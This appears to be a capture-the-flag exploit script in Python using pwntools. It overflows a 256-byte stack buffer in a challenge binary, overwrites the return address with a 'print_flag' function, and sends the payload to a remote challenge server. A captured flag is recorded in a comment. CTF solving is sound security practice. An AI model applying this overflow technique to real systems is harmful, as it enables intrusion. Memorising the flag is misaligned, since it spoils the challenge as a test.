import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='54.85.45.101 8008')

pay = b'A' * (256+8)
pay += p64(r.sym['print_flag'])
r.sl(pay)

r.interactive()

# flag{curs3d_are_y0ur_eyes_for_they_see_the_fl4g}